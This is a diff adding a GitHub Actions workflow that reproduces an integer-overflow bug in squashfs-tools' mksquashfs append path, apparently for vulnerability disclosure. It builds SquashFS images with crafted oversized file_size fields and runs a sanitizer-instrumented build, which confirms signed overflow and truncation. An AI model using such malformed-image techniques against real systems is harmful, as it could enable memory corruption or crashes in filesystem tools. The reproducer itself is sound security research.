@@ -1,0 +1,152 @@
+name: lf-633 append-reader context reproducer
+
+on:
+  push:
+    branches:
+      - lf-633-append-exec
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+      - name: Exercise exact-current read_fs append path
+        shell: bash
+        env:
+          UPSTREAM_HEAD: 5436ec0e5bf50dd8f7fe182d9ffd92b0861cb491
+        run: |
+          set -euxo pipefail
+          sudo apt-get update
+          sudo apt-get install -y build-essential clang zlib1g-dev liblzma-dev liblzo2-dev liblz4-dev libzstd-dev
+
+          rm -rf /tmp/sq /tmp/src /tmp/append-src /tmp/evidence
+          mkdir -p /tmp/src /tmp/append-src /tmp/evidence
+          uname -a | tee /tmp/evidence/environment.txt
+          clang --version | tee -a /tmp/evidence/environment.txt
+          git --version | tee -a /tmp/evidence/environment.txt
+
+          git clone https://github.com/plougher/squashfs-tools.git /tmp/sq
+          git -C /tmp/sq checkout --detach "$UPSTREAM_HEAD"
+          test "$(git -C /tmp/sq rev-parse HEAD)" = "$UPSTREAM_HEAD"
+          git -C /tmp/sq show -s --format='%H %cI %s' HEAD | tee /tmp/evidence/upstream-head.txt
+
+          make -C /tmp/sq/squashfs-tools -j2 mksquashfs
+          cp /tmp/sq/squashfs-tools/mksquashfs /tmp/mksquashfs-generator
+
+          cat > /tmp/layout.c <<'EOF'
+          #include <stddef.h>
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include "squashfs_fs.h"
+          int main(int argc, char **argv) {
+              FILE *f; struct squashfs_super_block sb; unsigned short mh;
+              unsigned int len; unsigned char *buf;
+              struct squashfs_base_inode_header *base;
+              struct squashfs_lreg_inode_header *inode;
+              if(argc != 2) return 2;
+              f = fopen(argv[1], "rb"); if(!f) return 3;
+              if(fread(&sb, sizeof(sb), 1, f) != 1) return 4;
+              if(fseeko(f, sb.inode_table_start, SEEK_SET) != 0) return 5;
+              if(fread(&mh, sizeof(mh), 1, f) != 1 || (mh & 0x8000) == 0) return 6;
+              len = mh & 0x7fff; buf = malloc(len); if(!buf) return 7;
+              if(fread(buf, 1, len, f) != len) return 8;
+              base = (struct squashfs_base_inode_header *) buf;
+              if(base->inode_type != SQUASHFS_LREG_TYPE) return 9;
+              inode = (struct squashfs_lreg_inode_header *) buf;
+              printf("BLOCK_SIZE=%u\n", sb.block_size);
+              printf("INODE_TABLE_START=%lld\n", (long long) sb.inode_table_start);
+              printf("FILE_SIZE_ABS=%lld\n", (long long) sb.inode_table_start + 2 + (long long) offsetof(struct squashfs_lreg_inode_header, file_size));
+              printf("INODE_TYPE=%u\n", base->inode_type);
+              printf("FILE_SIZE=%lld\n", inode->file_size);
+              printf("FRAGMENT=%u\n", inode->fragment);
+              printf("NLINK=%u\n", inode->nlink);
+              free(buf); fclose(f); return 0;
+          }
+          EOF
+          cc -O2 -I/tmp/sq/squashfs-tools /tmp/layout.c -o /tmp/layout
+
+          printf Z > /tmp/src/file
+          ln /tmp/src/file /tmp/src/file-hardlink
+          printf A > /tmp/append-src/new-file
+          /tmp/mksquashfs-generator /tmp/src /tmp/base.sqfs -noI -no-fragments -nopad -noappend -no-progress
+          /tmp/layout /tmp/base.sqfs | tee /tmp/evidence/layout.txt
+          grep -q '^INODE_TYPE=9$' /tmp/evidence/layout.txt
+          grep -q '^FRAGMENT=4294967295$' /tmp/evidence/layout.txt
+          grep -q '^NLINK=2$' /tmp/evidence/layout.txt
+
+          block="$(awk -F= '$1=="BLOCK_SIZE" {print $2}' /tmp/evidence/layout.txt)"
+          off="$(awk -F= '$1=="FILE_SIZE_ABS" {print $2}' /tmp/evidence/layout.txt)"
+          safe_blocks=$((2147483647 / 4))
+          overflow_blocks=$((safe_blocks + 1))
+          intplus_blocks=2147483648
+          safe_size=$((safe_blocks * block))
+          overflow_size=$((overflow_blocks * block))
+          intplus_size=$((intplus_blocks * block))
+          printf 'block=%s safe_blocks=%s overflow_blocks=%s intplus_blocks=%s safe_size=%s overflow_size=%s intplus_size=%s llmax=%s\n' \
+            "$block" "$safe_blocks" "$overflow_blocks" "$intplus_blocks" "$safe_size" "$overflow_size" "$intplus_size" 9223372036854775807 | tee /tmp/evidence/boundaries.txt
+
+          patch_size() {
+              local dst="$1" value="$2"
+              cp /tmp/base.sqfs "$dst"
+              python3 - "$dst" "$off" "$value" <<'PY'
+          import hashlib, struct, sys
+          p, off, value = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
+          d = bytearray(open(p, 'rb').read())
+          old = struct.unpack_from('<q', d, off)[0]
+          struct.pack_into('<q', d, off, value)
+          open(p, 'wb').write(d)
+          print(f"path={p} offset={off} old={old} new={value} sha256={hashlib.sha256(d).hexdigest()}")
+          PY
+          }
+
+          patch_size /tmp/safe.sqfs "$safe_size" | tee /tmp/evidence/mutations.txt
+          patch_size /tmp/mul-overflow.sqfs "$overflow_size" | tee -a /tmp/evidence/mutations.txt
+          patch_size /tmp/int-plus1.sqfs "$intplus_size" | tee -a /tmp/evidence/mutations.txt
+          patch_size /tmp/llmax.sqfs 9223372036854775807 | tee -a /tmp/evidence/mutations.txt
+          sha256sum /tmp/base.sqfs /tmp/safe.sqfs /tmp/mul-overflow.sqfs /tmp/int-plus1.sqfs /tmp/llmax.sqfs | tee /tmp/evidence/fixture-sha256.txt
+
+          make -C /tmp/sq/squashfs-tools clean
+          SAN='-O1 -g -fsanitize=address,undefined,implicit-integer-truncation,implicit-integer-sign-change -fno-sanitize-recover=all -fno-omit-frame-pointer'
+          make -C /tmp/sq/squashfs-tools -j2 CC=clang EXTRA_CFLAGS="$SAN" EXTRA_LDFLAGS='-fsanitize=address,undefined,implicit-integer-truncation,implicit-integer-sign-change' mksquashfs
+          cp /tmp/sq/squashfs-tools/mksquashfs /tmp/mksquashfs-sanitized
+          export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0'
+          export UBSAN_OPTIONS='halt_on_error=1:print_stacktrace=1'
+
+          run_case() {
+              local label="$1" image="$2"
+              cp "$image" "/tmp/${label}-run.sqfs"
+              set +e
+              /tmp/mksquashfs-sanitized /tmp/append-src "/tmp/${label}-run.sqfs" -noI -no-progress > "/tmp/evidence/${label}.log" 2>&1
+              local st=$?
+              set -e
+              echo "status=$st" >> "/tmp/evidence/${label}.log"
+              cat "/tmp/evidence/${label}.log"
+          }
+
+          run_case base /tmp/base.sqfs
+          run_case safe /tmp/safe.sqfs
+          run_case mul-overflow /tmp/mul-overflow.sqfs
+          run_case int-plus1 /tmp/int-plus1.sqfs
+          run_case llmax /tmp/llmax.sqfs
+
+          grep -q 'status=0' /tmp/evidence/base.log
+          ! grep -Eq 'runtime error:|AddressSanitizer|UndefinedBehaviorSanitizer' /tmp/evidence/base.log
+          grep -q 'Scanning existing filesystem' /tmp/evidence/safe.log
+          ! grep -Eq 'runtime error:|AddressSanitizer|UndefinedBehaviorSanitizer' /tmp/evidence/safe.log
+          grep -Eq 'signed integer overflow.*536870912.*4|536870912 \* 4.*cannot be represented' /tmp/evidence/mul-overflow.log
+          grep -Eq 'implicit conversion.*2147483648.*int|changed the value to -2147483648' /tmp/evidence/int-plus1.log
+          grep -q 'signed integer overflow' /tmp/evidence/llmax.log
+
+          cp /tmp/base.sqfs /tmp/safe.sqfs /tmp/mul-overflow.sqfs /tmp/int-plus1.sqfs /tmp/llmax.sqfs /tmp/evidence/
+          echo 'ALL LF-633 APPEND-PATH ASSERTIONS PASSED' | tee /tmp/evidence/result.txt
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: lf-633-append-context-evidence
+          path: /tmp/evidence
